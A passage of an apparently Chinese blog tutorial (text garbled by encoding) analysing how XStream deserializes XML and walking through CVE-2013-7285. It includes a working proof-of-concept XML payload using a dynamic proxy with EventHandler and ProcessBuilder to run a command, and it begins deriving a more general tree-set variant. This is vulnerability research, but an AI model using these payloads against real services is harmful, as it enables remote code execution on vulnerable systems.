serialization=\&quot;custom\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;org.exploit.othercase.XStream.Person&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;age&gt;22&lt;/age&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;name&gt;lucy&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;/org.exploit.othercase.XStream.Person&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/org.exploit.othercase.XStream.Person&gt;&quot;</span>;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person) xStream.fromXML(xml);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029164632174.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029164632174.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241029164632174"></p><h2 id="è°ƒè¯•åˆ†æ"><a href="#è°ƒè¯•åˆ†æ" class="headerlink" title="è°ƒè¯•åˆ†æ"></a>è°ƒè¯•åˆ†æ</h2><p>åœ¨fromXMLæ‰“ä¸Šæ–­ç‚¹</p><p>fromXMLè°ƒç”¨äº†unmarshal</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029182521214.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029182521214.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241029182521214"></p><p>unmarshalå†…éƒ¨è°ƒç”¨äº†ReferenceByXPathMarshallingStrategy.unmarshal</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029182620704.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029182620704.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241029182620704"></p><p>ReferenceByXPathMarshallingStrategyå†…éƒ¨å¹¶æ²¡æœ‰unmarshalæ–¹æ³•ï¼Œè½¬è€Œè°ƒç”¨å…¶æŠ½è±¡ç±»çš„unmarshal</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029182837650.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029182837650.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241029182837650"></p><p>AbstractTreeMarshallingStrategy.unmarshalè°ƒç”¨äº†createUnmarshallingContext</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029182933729.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029182933729.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241029182933729"></p><p>æ¥ç€è·Ÿï¼Œè°ƒç”¨äº†ReferenceByXPathUnmarshalleræ„é€ å‡½æ•°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029183124829.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029183124829.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241029183124829"></p><p>å°±æ˜¯ä¸ªå¥—å¨ƒèµ‹å€¼äº†ï¼Œè·³è¿‡è·³è¿‡</p><p>è·Ÿåˆ°AbstractTreeMarshallingStrategy.unmarshalå†…çš„context.start</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029183547247.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029183547247.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241029183547247"></p><p>åœ¨startæ–¹æ³•å†…ï¼Œé€šè¿‡HierarchicalStream.readClassTypeè¯»å–èŠ‚ç‚¹ç±»å‹ï¼Œæ¥ç€è°ƒç”¨convertAnotherè¿›è¡Œè½¬æ¢</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029184112273.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029184112273.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241029184112273"></p><p>HierarchicalStream.readClassTypeè¯»å–çš„ç»“æœï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029185019906.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029185019906.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241029185019906"></p><p>è·Ÿè¿›åˆ°convertAnotherï¼Œå…ˆæ˜¯ç”¨DefualtConverterLookup.lookupConverterForTypeå»æ ¹æ®ç±»å‹æŸ¥æ‰¾converterï¼Œå†è°ƒç”¨è¿™ä¸ªconverterçš„convertæ–¹æ³•</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029185447284.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029185447284.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241029185447284"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029185754633.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029185754633.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241029185754633"></p><p>å‘ç°è¿™ä¸ªDefaultConverterLookupé‡Œè£…é…äº†ä¸€å †converterï¼Œåœ¨å“ªè£…è¿›å»çš„å‘¢ï¼Ÿ</p><p>å‘ä¸Šé€†å‘ï¼Œå‘ç°XStreamçš„ä¸€ä¸ªæ„é€ å‡½æ•°å†…new DefaultConverterLookup</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029223139109.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029223139109.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241029223139109"></p><p>DefaultConverterLookupç±»ç»™é™æ€å˜é‡èµ‹å€¼ä¸ºäº†PrioritizedList</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029223523188.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029223523188.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241029223523188"></p><p>XStreamè°ƒç”¨åˆ°æœ€åçš„æ„é€ å‡½æ•°ï¼Œä¼šè°ƒç”¨setupConverters</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029224304492.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029224304492.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241029224304492"></p><p>setupConvertersæ–¹æ³•å°±æ ¹æ®äº†ä¸åŒçš„ååºåˆ—åŒ–typeé€‰æ‹©äº†ä¸åŒçš„Converter</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241029224330467.png" class="lazyload placeholder" data-srcset="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241029224330467.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241029224330467"></p><p>ç»§æ‰¿äº†Serializableå¹¶é‡å†™äº†readObjectè°ƒç”¨åˆ°çš„converteræ˜¯SerializableConverter</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029224612324.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029224612324.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241029224612324"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029224939884.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029224939884.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241029224939884"></p><p>å¦‚æœ ä¸å®ç°Serializableæ¥å£ æˆ–è€… åªå®ç°Serializableä¸é‡å†™readObjectï¼Œé‚£ä¹ˆconverteræ˜¯ReflectionConverter</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029225043696.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029225043696.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241029225043696"></p><p>XStreamçš„æ¼æ´å®˜ç½‘ï¼š</p><p><a href="https://x-stream.github.io/security.html">https://x-stream.github.io/security.html</a></p><h3 id="converteræ–‡ä»¶"><a href="#converteræ–‡ä»¶" class="headerlink" title="converteræ–‡ä»¶"></a>converteræ–‡ä»¶</h3><p>æˆ‘ä»¬éšä¾¿æ‰“å¼€ä¸€ä¸ªconverteræ–‡ä»¶ï¼Œå…¶ä¸­å°±ä¸‰ä¸ªä¸»è¦çš„æ–¹æ³•ï¼š</p><ul><li>canConvertæ–¹æ³•ï¼šå‘Šè¯‰XStreamå¯¹è±¡ï¼Œå®ƒèƒ½å¤Ÿè½¬æ¢çš„å¯¹è±¡ï¼›</li><li>marshalæ–¹æ³•ï¼šèƒ½å¤Ÿå°†å¯¹è±¡è½¬æ¢ä¸ºXMLæ—¶å€™çš„å…·ä½“æ“ä½œï¼›</li><li>unmarshalæ–¹æ³•ï¼šèƒ½å¤Ÿå°†XMLè½¬æ¢ä¸ºå¯¹è±¡æ—¶çš„å…·ä½“æ“ä½œï¼›</li></ul><h2 id="CVE-2013-7285"><a href="#CVE-2013-7285" class="headerlink" title="CVE-2013-7285"></a>CVE-2013-7285</h2><p>XStream version &lt;&#x3D; 1.4.6 &amp; XStream version &#x3D; 1.4.10</p><p>æ¼æ´ç‚¹ä½äºEventHandler.invokeInternalï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031111943717.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031111943717.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241031111943717"></p><p>MethodUtil.invokeå®é™…ä¸Šå°±æ˜¯Method.invokeåŠ äº†å¼‚å¸¸å¤„ç†ï¼Œå¯ä»¥è¾¾åˆ°æ‰§è¡Œä»»æ„æ–¹æ³•</p><p>EventHandler.invokeè°ƒç”¨äº†invokeInternal</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031112059056.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031112059056.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241031112059056"></p><p>EventHandleråˆå®ç°äº†InvocationHandleræ¥å£ï¼Œå±äºåŠ¨æ€ä»£ç†ç±»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031112141247.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031112141247.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241031112141247"></p><p>æ¥ä¸‹æ¥çœ‹çœ‹invokeä¸‰ä¸ªå‚æ•°æ€ä¹ˆæ¥çš„</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031112647537.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031112647537.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241031112647537"></p><p>å…ˆçœ‹ä¸‹EventHandlerçš„æ„é€ å‡½æ•°ï¼Œå…±è®¾ç½®äº†targetã€actionã€eventPropertyNameã€listenerMethodName</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031112850419.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031112850419.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>invokeInternalçš„ä¸»è¦ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">lastDot</span> <span class="operator">=</span> action.lastIndexOf(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (lastDot != -<span class="number">1</span>) &#123;</span><br><span class="line">    target = applyGetters(target, action.substring(<span class="number">0</span>, lastDot));</span><br><span class="line">    action = action.substring(lastDot + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Method</span> <span class="variable">targetMethod</span> <span class="operator">=</span> Statement.getMethod(target.getClass(),action, argTypes);</span><br><span class="line"><span class="keyword">return</span> MethodUtil.invoke(targetMethod, target, newArgs);</span><br></pre></td></tr></table></figure><blockquote><p>å‡è®¾actionå­—ç¬¦ä¸²ä¸º â€œuser.address.cityâ€ï¼Œ target æ˜¯ä¸€ä¸ªåŒ…å« user å±æ€§çš„å¯¹è±¡</p><p>é‚£ä¹ˆç»è¿‡ifä»£ç å—åï¼Œtarget ç°åœ¨æ˜¯ Address å¯¹è±¡ï¼Œaction ç°åœ¨æ˜¯ â€œcityâ€</p><p>é‚£ä¹ˆç»è¿‡Statement.getMethodåï¼Œè·å–äº†Addresså¯¹è±¡çš„cityæ–¹æ³•</p><p>ç®€å•è¯´æ¥å°±æ˜¯æœ€åä¸€ä¸ª<code>.</code>å‰é¢çš„æ˜¯ç±»ï¼Œåé¢æ˜¯æ–¹æ³•</p></blockquote><p>ä½†æ˜¯æˆ‘ä»¬å®Œå…¨å¯ä»¥å°†actionåªä¼ ä¸€ä¸ªæ–¹æ³•åï¼Œä¸å«<code>.</code>ï¼Œæ‰€ä»¥æ­¤å¤„å¯çœç•¥ï¼Œçœ‹ä¸æ‡‚ä¹Ÿæ²¡å…³ç³»ï¼Œæ¥ç€å¾€ä¸‹çœ‹å°±çŸ¥é“äº†</p><p>ç°åœ¨å†æ¥çœ‹XStreamæä¾›çš„åŠ¨æ€ä»£ç†æ ‡ç­¾</p><h3 id="DynamicProxyConverter"><a href="#DynamicProxyConverter" class="headerlink" title="DynamicProxyConverter"></a>DynamicProxyConverter</h3><p>XStreamç»™å‡ºäº†å„ä¸ªconverterå¯¹åº”çš„xmlæ ¼å¼</p><p><a href="https://x-stream.github.io/converters.html">https://x-stream.github.io/converters.html</a></p><p>å…¶ä¸­DynamicProxyConverteré€‚ç”¨äºåŠ¨æ€ä»£ç†ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031115841506.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031115841506.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241031115841506"></p><p>codeï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dynamic-proxy&gt;</span><br><span class="line">  &lt;interface&gt;com.foo.Blah&lt;/interface&gt;</span><br><span class="line">  &lt;interface&gt;com.foo.Woo&lt;/interface&gt;</span><br><span class="line">  &lt;handler class=<span class="string">&quot;com.foo.MyHandler&quot;</span>&gt;</span><br><span class="line">    &lt;something&gt;blah&lt;/something&gt;</span><br><span class="line">  &lt;/handler&gt;</span><br><span class="line">&lt;/dynamic-proxy&gt; </span><br></pre></td></tr></table></figure><p>å¯¹ç…§Proxy.newProxyInstanceçš„å‚æ•°æ¥çœ‹</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031120232582.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031120232582.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241031120232582"></p><p><code>interface</code>æ ‡ç­¾ä»£è¡¨äº†ä»£ç†çš„æ¥å£ï¼Œ<code>handler</code>æ ‡ç­¾ä»£è¡¨InvocationHandlerå®ä¾‹ï¼Œ<code>something</code>æ ‡ç­¾æ˜¯ä¼ é€’ç»™handlerçš„é¢å¤–é…ç½®ä¿¡æ¯</p><p>POC XMLï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.util.Map<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br></pre></td></tr></table></figure><p>POCï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public class EventHandler &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        String payload = &quot;<span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;    <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.util.Map<span class="tag">&lt;/<span class="name">interface</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;    <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">\</span>&quot;<span class="attr">java.beans.EventHandler</span>\&quot;&gt;</span>\n&quot; +</span><br><span class="line">                &quot;        <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">\</span>&quot;<span class="attr">java.lang.ProcessBuilder</span>\&quot;&gt;</span>\n&quot; +</span><br><span class="line">                &quot;            <span class="tag">&lt;<span class="name">command</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;        \t\t\t\t<span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;            <span class="tag">&lt;/<span class="name">command</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;        <span class="tag">&lt;/<span class="name">target</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;        <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;    <span class="tag">&lt;/<span class="name">handler</span>&gt;</span>\n&quot; +</span><br><span class="line">                &quot;<span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span>&quot;;</span><br><span class="line">        XStream xStream = new XStream();</span><br><span class="line">        Map map = (Map) xStream.fromXML(payload);</span><br><span class="line">        map.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»£ç†ä¸€ä¸‹Mapæ¥å£åšæµ‹è¯•ï¼Œåˆ©ç”¨äº†ProcesserBuilder.start</p><p>å®é™…åˆ©ç”¨çš„æ—¶å€™éœ€è¦æ”¹ä¸‹ä»£ç†æ¥å£ä¸ºä»£ç åç»­è°ƒç”¨åˆ°çš„æ¥å£</p><p>é‚£æœ‰æ²¡æœ‰åŠæ³•æä¸ªæ›´é€šç”¨çš„å‘¢ï¼Ÿ</p><h3 id="é€šç”¨POC"><a href="#é€šç”¨POC" class="headerlink" title="é€šç”¨POC"></a>é€šç”¨POC</h3><ul><li>åˆ«å¿˜äº†dynamic-proxyæ ‡ç­¾å¤–è¿˜å¯ä»¥åµŒå¥—æ ‡ç­¾ï¼Œç­‰äºåµŒå¥—äº†ä¸€ä¸ªconverter</li></ul><p>è¿™é‡Œæ‰¾åˆ°äº†TreeSetConverterï¼š</p><p>è°ƒç”¨äº†TreeMapConverter.populateTreeMap</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031150015740.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031150015740.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241031150015740"></p><p>populateTreeMapå†…éƒ¨ï¼Œå¦‚æœè¯¥æ ‡ç­¾å·²ç»åœ¨ç¬¬ä¸€ä¸ªå…ƒç´ å†…ï¼ˆæ²¡æœ‰å­èŠ‚ç‚¹ï¼‰ï¼Œåˆ™è°ƒç”¨putCurrentEntryIntoMapï¼Œå¦åˆ™è°ƒç”¨populateMap</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031150744928.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031150744928.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241031150744928"></p><p>populateMapå¾ªç¯åˆ¤æ–­æœ‰æ— å­èŠ‚ç‚¹ï¼Œç„¶åè°ƒç”¨putCurrentEntryIntoMap</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031150937413.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031150937413.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241031150937413"></p><p>ä¹Ÿå°±æ˜¯ä»å†…åˆ°å¤–è§£ææ ‡ç­¾ï¼Œè°ƒç”¨putCurrentEntryIntoMap</p><p>putCurrentEntryIntoMapåˆ†åˆ«å¯¹keyå’Œvalueè°ƒç”¨äº†readItemï¼Œè¿™æ˜¯å› ä¸ºSetå¯ä»¥å­˜æ”¾Entry</p><blockquote><p>Map ç”¨äºå­˜å‚¨é”®å€¼å¯¹ï¼Œé”®å¿…é¡»å”¯ä¸€ï¼Œå€¼å¯ä»¥é‡å¤ã€‚<br>Set ç”¨äºå­˜å‚¨å”¯ä¸€çš„é”®å€¼å¯¹ï¼Œä¸å…è®¸é‡å¤</p></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031151029373.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031151029373.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241031151029373"></p><p>readItemå†…éƒ¨åˆåµŒå¥—çš„æ ¹æ®TypeæŸ¥æ‰¾converterå¹¶å¤„ç†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031151114510.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031151114510.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241031151114510"></p><p>ä½ ä¸€çœ‹å®˜æ–¹ç»™çš„xmlç¤ºä¾‹ï¼Œè‚¯å®šå°±ç†è§£äº†ä¸Šé¢çš„å†…å®¹ï¼š</p><ul><li>tree-mapï¼š</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tree-map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&quot;com.blah.MyComparator&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>apple<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">float</span>&gt;</span>123.553<span class="tag">&lt;/<span class="name">float</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>orange<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">float</span>&gt;</span>55.4<span class="tag">&lt;/<span class="name">float</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tree-map</span>&gt;</span> </span><br></pre></td></tr></table></figure><ul><li>tree-setï¼šEntryå¯ä»¥å…ˆåªæ”¾key</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tree-set</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&quot;com.blah.MyComparator&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">string</span>&gt;</span>apple<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">string</span>&gt;</span>banana<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">string</span>&gt;</span>cabbage<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tree-set</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>å…³é”®åœ¨äºï¼ŒpopulateMapè§£æå®Œæ•´ä¸ªtree-mapå†…çš„é”®å€¼å¯¹åï¼Œè°ƒç”¨äº†result.putAll</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031151902279.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031151902279.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241031151902279"></p><p>Tree.putAllçš„å‚æ•°mapæ˜¯Proxyï¼Œè‚¯å®šä¸ä¼šæ˜¯SortedMapå­ç±»ï¼Œè¿›ä¸å»ifï¼Œçœ‹åˆ°super.putAll</p><p><img 